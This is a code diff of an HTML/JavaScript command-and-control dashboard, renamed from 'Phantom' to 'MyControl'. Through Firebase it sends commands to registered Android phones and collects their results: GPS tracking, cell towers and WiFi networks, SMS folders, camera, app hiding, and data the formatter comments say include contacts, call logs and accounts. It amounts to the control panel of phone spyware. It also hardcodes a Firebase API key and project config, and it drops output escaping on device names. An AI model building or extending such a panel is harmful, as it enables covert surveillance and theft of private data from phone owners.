@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Phantom Dashboard · C2</title>
+    <title>MyControl · C2 Dashboard</title>
 
     <script src="https://www.gstatic.com/firebasejs/12.15.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore-compat.js"></script>
@@ -69,11 +69,6 @@
             padding: 14px 20px; border-top: 1px solid #1e2230;
             font-size: 12px; color: #5a6070;
         }
-        .sidebar-footer a {
-            color: #6b7280; cursor: pointer; display: flex; align-items: center; gap: 6px; font-size: 12px;
-            text-decoration: none;
-        }
-        .sidebar-footer a:hover { color: #e4e7ed; }
 
         .main { flex: 1; padding: 28px 32px; max-width: 100%; overflow-x: hidden; }
         .view { display: none; }
@@ -390,6 +385,11 @@
         .modal-buttons { display: flex; gap: 10px; margin-top: 18px; justify-content: flex-end; flex-wrap: wrap; }
         .modal-buttons .btn { font-size: 12px; padding: 7px 16px; }
 
+        .settings-group { margin: 12px 0; }
+        .settings-group label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6070; display: block; margin-top: 12px; font-weight: 600; }
+        .settings-group input { width: 100%; padding: 8px 12px; border-radius: 6px; background: #0b0d12; border: 1px solid #1e2230; color: #e4e7ed; font-size: 12px; font-family: 'SF Mono', monospace; margin-top: 3px; }
+        .settings-group .hint { font-size: 10px; color: #5a6070; margin-top: 3px; }
+
         .diagnostic-box {
             display: none; background: #06080d; border: 1px solid #1a1e2c;
             border-radius: 8px; padding: 14px; margin-top: 16px;
@@ -536,21 +536,6 @@
         }
         .struct-toggle:hover { text-decoration: underline; }
 
-        /* ═══ DEVICE HEADER (Command Center) ═══ */
-        .device-header-bar {
-            background: #101218; border: 1px solid #1e2230;
-            border-radius: 12px; padding: 18px 20px; margin-bottom: 20px;
-            display: flex; align-items: center; gap: 14px;
-        }
-        .device-header-bar .dh-name { font-weight: 700; font-size: 16px; }
-        .device-header-bar .dh-detail { font-size: 12px; color: #6b7280; font-family: monospace; }
-        .device-header-bar .dh-status {
-            font-size: 12px; font-weight: 600; padding: 4px 12px;
-            border-radius: 20px;
-        }
-        .device-header-bar .dh-status.online { background: #065f4622; color: #34d399; }
-        .device-header-bar .dh-status.offline { background: #7f1d1d22; color: #f87171; }
-
         @media (max-width: 768px) {
             .sidebar { display: none; }
             .main { padding: 16px; }
@@ -570,8 +555,8 @@
 
         <aside class="sidebar">
             <div class="sidebar-header">
-                <div class="logo">PH</div>
-                <h1>Phantom</h1>
+                <div class="logo">MC</div>
+                <h1>MyControl</h1>
             </div>
             <nav class="sidebar-nav">
                 <div class="nav-label">Main</div>
@@ -596,7 +581,9 @@
                 </div>
             </nav>
             <div class="sidebar-footer">
-                <a onclick="signOutUser()">🚪 Sign Out</a>
+                <a onclick="openSettings()" style="cursor:pointer;color:#6b7280;display:flex;align-items:center;gap:6px;font-size:12px;">
+                    ⚙️ Config
+                </a>
             </div>
         </aside>
 
@@ -614,7 +601,7 @@
                             <span class="loading-spinner" style="width:12px;height:12px;border-width:2px;"></span> authenticating
                         </span>
                         <button class="btn btn-ghost btn-sm" onclick="refreshDevices()">⟳ Refresh</button>
-                        <button class="btn btn-danger btn-sm" onclick="signOutUser()">🚪 Sign Out</button>
+                        <button class="btn btn-ghost btn-sm" onclick="openSettings()">⚙️</button>
                     </div>
                 </div>
 
@@ -653,7 +640,7 @@
                 <div class="topbar">
                     <div class="topbar-left">
                         <h2>⌘ Command Center</h2>
-                        <p id="cmdDeviceSub">Select a device from Dashboard</p>
+                        <p>Device: <span id="cmdDeviceDisplay" style="font-family:monospace;">—</span></p>
                     </div>
                     <div class="topbar-right">
                         <button class="btn btn-ghost btn-sm" onclick="showView('dashboard')">← Back</button>
@@ -661,17 +648,6 @@
                         <button class="btn btn-ghost btn-sm" onclick="clearCmdResults()">Clear</button>
                         <button class="btn btn-ghost btn-sm" onclick="retryLastFailedCmd()">↻ Retry Failed</button>
                         <button class="btn btn-ghost btn-sm" onclick="refreshPendingResults()">⟳ Load Pending</button>
-                    </div>
-                </div>
-
-                <!-- ═══ DEVICE HEADER — Now shows name + model ═══ -->
-                <div class="device-header-bar" id="cmdDeviceHeader">
-                    <div>
-                        <div class="dh-name" id="cmdDhName">No device selected</div>
-                        <div class="dh-detail" id="cmdDhDetail">—</div>
-                    </div>
-                    <div style="margin-left:auto;display:flex;align-items:center;gap:10px;">
-                        <span class="dh-status" id="cmdDhStatus">—</span>
                     </div>
                 </div>
 
@@ -902,11 +878,47 @@
         </div>
     </div>
 
+    <div class="modal-overlay" id="settingsModal">
+        <div class="modal-box" style="max-width:500px;">
+            <h3>⚙️ Firebase Configuration</h3>
+            <p>Update these from Firebase Console → Project Settings → General → Your Web App</p>
+            <div class="settings-group">
+                <label>API Key</label>
+                <input id="cfg_apiKey" value="AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o" />
+                <div class="hint">Web API key — NOT the Android key from google-services.json</div>
+            </div>
+            <div class="settings-group">
+                <label>Auth Domain</label>
+                <input id="cfg_authDomain" value="control-f5136.firebaseapp.com" />
+            </div>
+            <div class="settings-group">
+                <label>Project ID</label>
+                <input id="cfg_projectId" value="control-f5136" />
+            </div>
+            <div class="settings-group">
+                <label>Storage Bucket</label>
+                <input id="cfg_storageBucket" value="control-f5136.firebasestorage.app" />
+            </div>
+            <div class="settings-group">
+                <label>Messaging Sender ID</label>
+                <input id="cfg_messagingSenderId" value="204625008820" />
+            </div>
+            <div class="settings-group">
+                <label>App ID</label>
+                <input id="cfg_appId" value="1:204625008820:web:2802cd55ea8f327e6a9fe1" />
+            </div>
+            <div class="modal-buttons">
+                <button class="btn btn-ghost" onclick="closeSettings()">Cancel</button>
+                <button class="btn btn-primary" onclick="saveSettingsAndReconnect()">Save & Connect</button>
+            </div>
+        </div>
+    </div>
+
     <div class="toast-container" id="toastContainer"></div>
 
 <script>
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CATALOG
+    //  COMMAND CATALOG — FULLY CONSOLIDATED & SORTED
     // ═══════════════════════════════════════════════════════
     const CAT_NAMES = {
         device: 'Device Control',
@@ -924,7 +936,7 @@
             { icon: '🔄', name: 'Swipe', action: 'swipe', params: { x1: '300', y1: '800', x2: '300', y2: '200' } },
             { icon: '🔒', name: 'Lock Screen', action: 'lock_screen' },
             { icon: '💡', name: 'Flashlight', action: 'toggle_flashlight', isToggle: true },
-            { icon: '🔔', name: 'Notification', action: 'notify', params: { title: 'Phantom', body: 'Command received' } },
+            { icon: '🔔', name: 'Notification', action: 'notify', params: { title: 'MyControl', body: 'Command received' } },
             { icon: '💻', name: 'Device Info', action: 'get_device_info' },
             { icon: '🔋', name: 'Battery Info', action: 'get_battery_info' },
             { icon: '📶', name: 'Network Info', action: 'get_network_info' },
@@ -978,8 +990,8 @@
         ],
         loc: [
             { icon: '📍', name: 'GPS Once', action: 'get_location' },
-            // GPS Tracking handles BOTH start and stop — no standalone Stop Tracking button
             { icon: '🔄', name: 'GPS Tracking', action: 'start_tracking', isTrackingToggle: true, params: { interval_ms: '5000' } },
+            { icon: '⏹️', name: 'Stop Tracking', action: 'stop_tracking' },
             { icon: '📡', name: 'Cell Towers', action: 'get_cell_towers' },
             { icon: '📶', name: 'WiFi Networks', action: 'get_wifi_networks' },
             { icon: '🔋', name: 'Battery', action: 'get_battery_info' },
@@ -1003,8 +1015,12 @@
         deviceUnsubscribe: null,
         resultUnsub: null,
         writeStatus: 'ready',
+
+        // ── App Fetching ──
         installedApps: [],
         installAppsCmdId: null,
+
+        // ── Map / GPS ──
         locationMap: null,
         locationMarker: null,
         locationCircle: null,
@@ -1012,10 +1028,14 @@
         trackingPath: [],
         trackingPolyline: null,
         mapSectionVisible: false,
+
+        // ── History ──
         historyData: [],
         historyFiltered: [],
         historySortKey: 'time',
         historySortAsc: false,
+
+        // ── Seekbar tracked IDs ──
         seekbarIdCounter: 0,
     };
 
@@ -1027,33 +1047,44 @@
     let pingCount = 0;
 
     // ═══════════════════════════════════════════════════════
-    //  FIREBASE CONFIG (fixed, no Settings UI)
+    //  FIREBASE CONFIG
     // ═══════════════════════════════════════════════════════
-    const FIREBASE_CONFIG = {
-        apiKey: "AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o",
-        authDomain: "control-f5136.firebaseapp.com",
-        projectId: "control-f5136",
-        storageBucket: "control-f5136.firebasestorage.app",
-        messagingSenderId: "204625008820",
-        appId: "1:204625008820:web:2802cd55ea8f327e6a9fe1"
-    };
+    function getConfig() {
+        const stored = localStorage.getItem('mc_firebase_config');
+        if (stored) {
+            try {
+                const parsed = JSON.parse(stored);
+                if (parsed.apiKey && parsed.projectId) return parsed;
+            } catch(e) {}
+        }
+        return {
+            apiKey: "AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o",
+            authDomain: "control-f5136.firebaseapp.com",
+            projectId: "control-f5136",
+            storageBucket: "control-f5136.firebasestorage.app",
+            messagingSenderId: "204625008820",
+            appId: "1:204625008820:web:2802cd55ea8f327e6a9fe1"
+        };
+    }
 
     // ═══════════════════════════════════════════════════════
     //  INIT
     // ═══════════════════════════════════════════════════════
     document.addEventListener('DOMContentLoaded', () => {
-        appendDiag('DOM ready. Initializing Firebase…');
+        appendDiag('DOM ready. Initializing Firebase with Web App config…');
         initFirebase();
     });
 
     function initFirebase() {
-        appendDiag('Config: project=' + FIREBASE_CONFIG.projectId);
+        const cfg = getConfig();
+        appendDiag('Config: project=' + cfg.projectId + ', apiKey=' + cfg.apiKey.slice(0, 10) + '…');
 
         try {
-            app = firebase.initializeApp(FIREBASE_CONFIG);
+            app = firebase.initializeApp(cfg);
             db = app.firestore();
             auth = app.auth();
             db.settings({ merge: true });
+
             appendDiag('Firebase SDK initialized');
 
             const authTimeout = setTimeout(() => {
@@ -1065,8 +1096,9 @@
                         <div class="big-icon">⏱️</div>
                         <h3>Authentication Timed Out</h3>
                         <p>Firebase didn't respond in 15 seconds.</p>
-                        <p class="sub">Make sure <b>Anonymous Sign-in</b> is enabled in Firebase Console</p>
-                        <div style="margin-top:16px;">
+                        <p class="sub">Make sure <b>Anonymous Sign-in</b> is enabled in Firebase Console → Authentication → Sign-in methods</p>
+                        <div style="margin-top:16px;display:flex;gap:10px;justify-content:center;">
+                            <button class="btn btn-primary" onclick="openSettings()">⚙️ Config</button>
                             <button class="btn btn-ghost" onclick="location.reload()">⟳ Retry</button>
                         </div>
                     </div>
@@ -1094,10 +1126,10 @@
                     let tip = '';
                     if (err.code === 'auth/operation-not-allowed') {
                         tip = 'Go to Firebase Console → Authentication → Sign-in methods → Enable <b>Anonymous</b>';
-                    } else if (err.code === 'auth/api-key-not-valid') {
-                        tip = 'API key rejected. Check your Firebase config.';
+                    } else if (err.code === 'auth/api-key-not-valid' || err.code === 'auth/invalid-api-key') {
+                        tip = 'API key rejected. Make sure you\'re using the <b>Web App API key</b> (not the Android one). Open ⚙️ Config to check.';
                     } else {
-                        tip = 'Check Firebase Console.';
+                        tip = 'Check Firebase Console and your config. Click ⚙️ Config to edit.';
                     }
                     document.getElementById('deviceListContainer').innerHTML = `
                         <div class="empty-state">
@@ -1105,34 +1137,26 @@
                             <h3>Authentication Failed</h3>
                             <p><code>${err.code}</code>: ${escapeHtml(err.message)}</p>
                             <p class="sub" style="margin-top:12px;">${tip}</p>
-                            <div style="margin-top:16px;">
+                            <div style="margin-top:16px;display:flex;gap:10px;justify-content:center;">
+                                <button class="btn btn-primary" onclick="openSettings()">⚙️ Config</button>
                                 <button class="btn btn-ghost" onclick="location.reload()">⟳ Retry</button>
                             </div>
                         </div>
                     `;
                 });
+
         } catch (e) {
             appendDiag('❌ Init error: ' + e.message);
             setFirebaseStatus('error', 'Init: ' + e.message);
         }
     }
 
-    function signOutUser() {
-        if (auth) {
-            if (state.deviceUnsubscribe) { state.deviceUnsubscribe(); state.deviceUnsubscribe = null; }
-            if (state.resultUnsub) { state.resultUnsub(); state.resultUnsub = null; }
-            if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
-            auth.signOut().then(() => location.reload());
-        }
-    }
-
     function appendDiag(msg) {
         const dbg = document.getElementById('diagnosticBox');
-        if (!dbg) return;
         dbg.style.display = 'block';
         dbg.innerHTML += '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n';
         dbg.scrollTop = dbg.scrollHeight;
-        console.log('[Phantom] ' + msg);
+        console.log('[MyControl] ' + msg);
     }
 
     function setFirebaseStatus(type, msg) {
@@ -1167,7 +1191,7 @@
                     });
                     pinged++;
                 } catch (e) {
-                    appendDiag(`⚠️ Ping write failed for ${(d.id||'').slice(0,8)}: ${e.message}`);
+                    appendDiag(`⚠️ Ping write failed for ${d.id.slice(0,8)}: ${e.message}`);
                 }
             }
         }
@@ -1180,7 +1204,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  DEVICE LISTENER — updates devices from Firestore
+    //  DEVICE LISTENER
     // ═══════════════════════════════════════════════════════
     function startDeviceListener() {
         state.loadingDevices = true;
@@ -1203,7 +1227,6 @@
                 renderDeviceList();
                 updateStats();
                 document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
-                refreshCmdCenterHeader();
                 pingOfflineDevices();
             }, err => {
                 state.loadingDevices = false;
@@ -1235,7 +1258,7 @@
     }
 
     async function refreshDevices() {
-        if (!firebaseInitialized || !db) { toast('Not connected.', 'error'); return; }
+        if (!firebaseInitialized || !db) { toast('Not connected. ⚙️ Config to retry.', 'error'); return; }
         state.loadingDevices = true;
         renderDeviceList();
         toast('Refreshing…', 'info');
@@ -1266,16 +1289,15 @@
             return;
         }
         if (state.devices.length === 0) {
-            container.innerHTML = `<div class="empty-state"><div class="big-icon">📡</div><h3>No devices registered</h3><p>No documents found in the <code>devices</code> collection</p><p class="sub">Devices appear once the Android app calls registerDevice()</p><button class="btn btn-primary btn-sm" style="margin-top:14px;" onclick="refreshDevices()">⟳ Check Again</button></div>`;
+            container.innerHTML = `<div class="empty-state"><div class="big-icon">📡</div><h3>No devices registered</h3><p>No documents found in the <code>devices</code> collection</p><p class="sub">Devices appear once the Android app calls FirestoreRepo.registerDevice()</p><button class="btn btn-primary btn-sm" style="margin-top:14px;" onclick="refreshDevices()">⟳ Check Again</button></div>`;
             return;
         }
         container.innerHTML = '<div class="device-grid">' +
             state.devices.map(d => {
                 const online = isOnline(d);
-                const short = (d.id||'').slice(0, 8) + '…' + (d.id||'').slice(-6);
+                const short = d.id.slice(0, 8) + '…' + d.id.slice(-6);
                 const lastSeenAgo = d.lastSeen ? Math.floor((Date.now() - d.lastSeen) / 1000) + 's ago' : '—';
                 const hasToken = d.fcmToken ? '🔔 FCM' : '📴 No FCM';
-                const name = d.deviceName || d.name || 'Android Device';
                 return `
                     <div class="device-card ${online ? 'online' : ''}"
                          onclick="onDeviceTap('${d.id}')"
@@ -1286,7 +1308,7 @@
                             <span class="dc-id">${short}</span>
                             <span class="dc-status ${online ? 'online' : 'offline'}">${online ? '● Online' : '○ Offline'}</span>
                         </div>
-                        <div class="dc-name">${escapeHtml(name)}</div>
+                        <div class="dc-name">${d.deviceName || 'Android Device'}</div>
                         <div class="dc-meta">
                             <span>🕐 ${lastSeenAgo}</span>
                             <span>${hasToken}</span>
@@ -1346,7 +1368,7 @@
         if (action === 'enter') { closeContextMenu(); selectDevice(deviceId); }
         else if (action === 'delete') {
             closeContextMenu();
-            document.getElementById('deleteModalInfo').textContent = 'Remove device ' + (deviceId||'').slice(0, 8) + '…' + (deviceId||'').slice(-6) + '?';
+            document.getElementById('deleteModalInfo').textContent = 'Remove device ' + deviceId.slice(0, 8) + '…' + deviceId.slice(-6) + '?';
             document.getElementById('deleteModal').dataset.deviceId = deviceId;
             document.getElementById('deleteModal').classList.add('open');
         }
@@ -1355,7 +1377,7 @@
     async function confirmDelete() {
         const deviceId = document.getElementById('deleteModal').dataset.deviceId;
         if (!deviceId) { closeDeleteModal(); return; }
-        try { await db.collection('devices').doc(deviceId).delete(); toast('Deleted', 'success'); }
+        try { await db.collection('devices').doc(deviceId).delete(); toast('Deleted: ' + deviceId.slice(0, 8) + '…', 'success'); }
         catch (e) { toast('Delete failed: ' + e.message, 'error'); }
         closeDeleteModal();
     }
@@ -1396,32 +1418,11 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  REFRESH COMMAND CENTER HEADER — shows name + model
-    // ═══════════════════════════════════════════════════════
-    function refreshCmdCenterHeader() {
-        const deviceId = state.selectedDeviceId;
-        if (!deviceId) return;
-
-        const d = state.devices.find(dev => dev.id === deviceId);
-        if (!d) return;
-
-        const online = isOnline(d);
-        const name = d.deviceName || d.name || 'Unnamed Device';
-        const model = d.model || d.deviceModel || '—';
-
-        document.getElementById('cmdDhName').textContent = name;
-        document.getElementById('cmdDhDetail').textContent = model + ' · ' + deviceId;
-        document.getElementById('cmdDhStatus').textContent = online ? '● Online' : '○ Offline';
-        document.getElementById('cmdDhStatus').className = 'dh-status ' + (online ? 'online' : 'offline');
-        document.getElementById('cmdDeviceSub').textContent = 'Device: ' + name;
-    }
-
-    // ═══════════════════════════════════════════════════════
     //  PENDING COMMAND LOADER
     // ═══════════════════════════════════════════════════════
     async function loadPendingResultsForDevice(deviceId) {
         if (!db || !firebaseInitialized) return;
-        appendDiag(`🔍 Checking for pending results for ${(deviceId||'').slice(0,8)}…`);
+        appendDiag(`🔍 Checking for pending results for ${deviceId.slice(0,8)}…`);
         try {
             const cmdSnapshot = await db.collection('commands')
                 .where('deviceId', '==', deviceId)
@@ -1481,10 +1482,9 @@
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    //  🔥 KEY FIX: REAL-TIME RESULTS LISTENER
-    //  Handles BOTH 'added' AND 'modified' for command results
-    // ═══════════════════════════════════════════════════════════
+    // ═══════════════════════════════════════════════════════
+    //  REAL-TIME RESULTS LISTENER
+    // ═══════════════════════════════════════════════════════
     function startResultListenerForDevice(deviceId) {
         if (!db || !firebaseInitialized) return;
         if (state.resultUnsub) state.resultUnsub();
@@ -1492,54 +1492,22 @@
         state.resultUnsub = db.collection('results')
             .onSnapshot(snapshot => {
                 snapshot.docChanges().forEach(change => {
-                    // 🔥 FIX: Handle BOTH 'added' AND 'modified'
-                    // 'added' fires on initial load and new documents
-                    // 'modified' fires when existing documents are updated
-                    // (e.g., status transitions: pending → ok/error)
-                    if (change.type === 'added' || change.type === 'modified') {
+                    if (change.type === 'added') {
                         const docId = change.doc.id;
                         const data = change.doc.data();
-
-                        // Check if this is a command result we're tracking
                         const existing = state.results.find(r => r.id === docId);
-                        if (existing) {
-                            const newStatus = data.status || 'error';
-                            const newOutput = data.output || '—';
-                            const hadChanged = existing.status !== newStatus || existing.output !== newOutput;
-
-                            existing.status = newStatus;
-                            existing.output = newOutput;
-
-                            if (hadChanged) {
-                                renderCmdResults();
-                                updateCmdStatusIndicator(newStatus);
-
-                                // Toast only on meaningful transitions
-                                if (newStatus === 'ok') {
-                                    toast('✓ ' + (existing.name || existing.action), 'success');
-                                } else if (newStatus === 'error') {
-                                    toast('✗ ' + (existing.name || existing.action), 'error');
-                                }
-
-                                // Handle location data
-                                if (existing.action === 'get_location' || data.action === 'location_update') {
-                                    handleLocationResult(data, docId);
-                                }
-                            }
+                        if (existing && (existing.status === 'sent' || existing.status === 'pending')) {
+                            updateCmdResult(docId, data.status || 'error', data.output || '—');
+                            toast(data.status === 'ok' ? '✓ ' + existing.name : '✗ ' + existing.name,
+                                  data.status === 'ok' ? 'success' : 'error');
                         }
-
-                        // Also check for ping results — update device lastSeen
-                        if (data.deviceId) {
-                            const dev = state.devices.find(d => d.id === data.deviceId);
-                            if (dev) {
-                                dev.lastSeen = Date.now();
-                                renderDeviceList();
-                                updateStats();
-                                refreshCmdCenterHeader();
-                            }
+                        if (data.action === 'location_update' || data.action === 'get_location') {
+                            handleLocationResult(data, docId);
                         }
-
-                        // Handle location data regardless of tracking
+                    }
+                    if (change.type === 'modified') {
+                        const docId = change.doc.id;
+                        const data = change.doc.data();
                         if (data.action === 'location_update' || data.action === 'get_location') {
                             handleLocationResult(data, docId);
                         }
@@ -1559,11 +1527,12 @@
         if (state.locationMap) { state.locationMap.remove(); state.locationMap = null; }
 
         state.locationMap = L.map(mapContainer, {
-            zoomControl: true
+            zoomControl: true,
+            attributionControl: true
         }).setView([0, 0], 2);
 
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '&copy; OpenStreetMap',
+            attribution: '&copy; <a href="https://openstreetmap.org/copyright">OpenStreetMap</a>',
             maxZoom: 19
         }).addTo(state.locationMap);
 
@@ -1635,11 +1604,11 @@
             const container = document.getElementById('fullMapContainer');
             if (window._fullMap) { window._fullMap.remove(); window._fullMap = null; }
 
-            const fullMap = L.map(container, { zoomControl: true })
+            const fullMap = L.map(container, { zoomControl: true, attributionControl: true })
                 .setView([lat || 0, lng || 0], lat ? 16 : 2);
 
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; OpenStreetMap',
+                attribution: '&copy; <a href="https://openstreetmap.org/copyright">OpenStreetMap</a>',
                 maxZoom: 19
             }).addTo(fullMap);
 
@@ -1700,7 +1669,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  TRACKING (GPS Tracking handles both start AND stop)
+    //  TRACKING
     // ═══════════════════════════════════════════════════════
     function startTrackingOnDevice(intervalMs) {
         if (state.trackingActive) { toast('Tracking already active', 'info'); return; }
@@ -1716,7 +1685,8 @@
     }
 
     function stopTrackingOnDevice() {
-        // GPS Tracking button handles stop internally — no standalone Stop Tracking cmd
+        const cmd = COMMANDS.loc.find(c => c.action === 'stop_tracking');
+        if (cmd) executeCmd(cmd, {});
         state.trackingActive = false;
         if (state.trackingInterval) { clearInterval(state.trackingInterval); state.trackingInterval = null; }
         updateTrackingUI();
@@ -1901,10 +1871,8 @@
         document.getElementById('cmdCountDisplay').textContent = '0';
         document.getElementById('cmdLastStatus').textContent = 'Ready';
         document.getElementById('cmdLastStatus').className = 'value green';
-
-        // Update header with name + model
-        refreshCmdCenterHeader();
-
+        document.getElementById('cmdDeviceDisplay').textContent = deviceId.slice(0, 8) + '…' + deviceId.slice(-6);
+        document.getElementById('cmdDeviceDisplay').title = deviceId;
         document.getElementById('cmdHistoryBtn').style.display = 'inline-flex';
 
         // Enable history nav
@@ -1921,7 +1889,7 @@
         state.trackingPath = [];
         updateTrackingUI();
 
-        toast('Controlling: ' + getDeviceDisplayName(deviceId), 'info');
+        toast('Controlling: ' + deviceId.slice(0, 12) + '…', 'info');
 
         setTimeout(() => {
             loadPendingResultsForDevice(deviceId);
@@ -1929,17 +1897,10 @@
         }, 1000);
     }
 
-    function getDeviceDisplayName(deviceId) {
-        const d = state.devices.find(dev => dev.id === deviceId);
-        if (!d) return deviceId.slice(0, 12) + '…';
-        return d.deviceName || d.name || deviceId.slice(0, 12) + '…';
-    }
-
     function openHistoryForDevice() {
         if (state.selectedDeviceId) {
-            const d = state.devices.find(dev => dev.id === state.selectedDeviceId);
-            const name = d ? (d.deviceName || d.name || state.selectedDeviceId) : state.selectedDeviceId;
-            document.getElementById('histDeviceDisplay').textContent = name;
+            document.getElementById('histDeviceDisplay').textContent =
+                state.selectedDeviceId.slice(0, 8) + '…' + state.selectedDeviceId.slice(-6);
             document.getElementById('histDeviceDisplay').title = state.selectedDeviceId;
             showView('history');
         }
@@ -1982,7 +1943,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  PARAM MODAL
+    //  PARAM MODAL — WITH SEEK BAR SUPPORT
     // ═══════════════════════════════════════════════════════
     function showParamModal(cmd) {
         const modal = document.getElementById('paramModal');
@@ -2003,6 +1964,7 @@
         document.getElementById('modalDefaultButtons').style.display = 'flex';
         document.getElementById('modalFindPhoneButtons').style.display = 'none';
 
+        // Handle Find Phone
         if (cmd.isFindPhone) {
             document.getElementById('modalFindPhone').style.display = 'block';
             document.getElementById('modalDefaultButtons').style.display = 'none';
@@ -2013,10 +1975,12 @@
             return;
         }
 
+        // SMS Folder
         if (cmd.isSmsFolder) {
             document.getElementById('modalSmsFolderSelector').style.display = 'block';
         }
 
+        // Open App
         if (cmd.isOpenApp) {
             document.getElementById('modalOpenApp').style.display = 'block';
             document.getElementById('openAppPackageInput').value = '';
@@ -2035,7 +1999,7 @@
         }
         if (cmd.simSlot) document.getElementById('modalSimSelector').style.display = 'block';
 
-        // GPS Tracking — inline start/stop (no standalone Stop Tracking button)
+        // GPS Tracking with inline toggle
         if (cmd.isTrackingToggle) {
             document.getElementById('modalSub').textContent =
                 state.trackingActive
@@ -2087,7 +2051,7 @@
             return;
         }
 
-        // Seekbar support
+        // ═══ SEEK BAR SUPPORT ═══
         if (cmd.hasSeekbar) {
             const sb = cmd.hasSeekbar;
             const sbId = 'seekbar_' + (++state.seekbarIdCounter);
@@ -2108,6 +2072,7 @@
             range.value = Math.round((sb.min || 0 + sb.max || 100) / 2);
             range.step = 1;
 
+            // Fill initial gradient
             const pct = ((range.value - range.min) / (range.max - range.min)) * 100;
             range.style.background =
                 `linear-gradient(to right, #6c5ce7 0%, #6c5ce7 ${pct}%, #1e2230 ${pct}%, #1e2230 100%)`;
@@ -2130,6 +2095,7 @@
             valDisplay.textContent = `Raw: ${range.value}`;
             group.appendChild(valDisplay);
 
+            // Hidden input to store value for confirmation
             const hiddenInput = document.createElement('input');
             hiddenInput.type = 'hidden';
             hiddenInput.id = sbId + '_hidden';
@@ -2137,15 +2103,17 @@
             hiddenInput.value = range.value;
             group.appendChild(hiddenInput);
 
+            // Update hidden on range change
             range.addEventListener('input', function() {
                 document.getElementById(sbId + '_hidden').value = this.value;
             });
 
             fields.appendChild(group);
 
+            // If there are other params (like 'stream' for volume), show them
             if (cmd.params) {
                 Object.entries(cmd.params).forEach(([key, val]) => {
-                    if (key === sb.key) return;
+                    if (key === sb.key) return; // skip the seekbar key
                     const label = document.createElement('label');
                     label.textContent = key.replace(/_/g, ' ');
                     const input = document.createElement('input');
@@ -2157,6 +2125,7 @@
                 });
             }
         } else if (cmd.params) {
+            // Regular text params
             Object.entries(cmd.params).forEach(([key, val]) => {
                 if (key === 'limit' && cmd.hasLimit) return;
                 if (cmd.isOpenApp && (key === 'packageName' || key === 'pkg' || key === 'package')) return;
@@ -2186,10 +2155,12 @@
 
         const params = {};
 
+        // Regular text inputs
         document.querySelectorAll('#modalFields input').forEach(inp => {
             if (inp.id.startsWith('modal_param_')) {
                 if (inp.dataset.paramKey) params[inp.dataset.paramKey] = inp.value;
             }
+            // Seekbar hidden input
             if (inp.type === 'hidden' && inp.dataset.paramKey) {
                 params[inp.dataset.paramKey] = inp.value;
             }
@@ -2199,6 +2170,7 @@
         if (cmd.isCamera) params.camera = document.getElementById('cameraSelect').value;
         if (cmd.isHideShow) {
            const mode = document.getElementById('hideShowSelect').value;
+          
            if (mode === "hide") {
                cmd.action = "hide_app";
                params.action = "hide";
@@ -2237,7 +2209,7 @@
     });
 
     // ═══════════════════════════════════════════════════════
-    //  EXECUTE COMMAND — per-document listener for results
+    //  EXECUTE COMMAND
     // ═══════════════════════════════════════════════════════
     async function executeCmd(cmd, params) {
         const deviceId = state.selectedDeviceId;
@@ -2266,7 +2238,6 @@
             state.commandsSent++;
             document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
 
-            // Per-document listener fires on ANY change (create + update)
             const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
                 if (snap.exists) {
                     const d = snap.data();
@@ -2292,10 +2263,10 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  FORMAT RESULTS — Structured output
+    //  FORMAT RESULTS — THE KEY FIX: Unified structured view
     // ═══════════════════════════════════════════════════════
     function formatResultOutput(action, output) {
-        if (!output || output === '—') return escapeHtml(output || '');
+        if (!output || output === '—') return escapeHtml(output);
 
         const rawHtml = escapeHtml(String(output));
 
@@ -2306,6 +2277,7 @@
 
         if (!structActions.includes(action)) return rawHtml;
 
+        // ── Try JSON parse first ──
         let parsed = null;
         try {
             if (typeof output === 'string') parsed = JSON.parse(output);
@@ -2313,6 +2285,7 @@
         } catch(e) {}
 
         if (parsed) {
+            // JSON array → structured table
             if (Array.isArray(parsed)) {
                 if (parsed.length === 0) return '<span style="color:#6b7280;">(empty list)</span>';
                 let html = `<div class="ri-structured"><span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${parsed.length} items</span>`;
@@ -2341,6 +2314,7 @@
                 return html;
             }
 
+            // JSON object → key-value pairs
             if (typeof parsed === 'object') {
                 let html = '<div class="ri-structured">';
                 Object.entries(parsed).forEach(([k, v]) => {
@@ -2353,14 +2327,22 @@
             }
         }
 
-        // Non-JSON fallback
+        // ═════════════════════════════════════════════════════════
+        //  NON-JSON FALLBACK — Line-based structured view
+        //  Works for ALL data types uniformly: Contacts, Installed 
+        //  Apps, Call Log, SMS Threads, Accounts, device info, etc.
+        // ═════════════════════════════════════════════════════════
         if (typeof output === 'string') {
             const lines = output.split('\n').filter(l => l.trim());
+
+            // Separate indexed lines [N] from summary header lines
             const dataLines = lines.filter(l => /^\[\d+\]/.test(l.trim()));
             const headerLines = lines.filter(l => !/^\[\d+\]/.test(l.trim()));
 
             if (dataLines.length >= 1) {
                 let html = '<div class="ri-structured">';
+
+                // Show summary header if any (e.g. "45 apps:" or "call history:")
                 if (headerLines.length > 0) {
                     html += `<span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${escapeHtml(headerLines.join(' · '))}</span>`;
                 } else {
@@ -2372,11 +2354,14 @@
                     if (match) {
                         const idx = match[1];
                         let content = match[2];
+
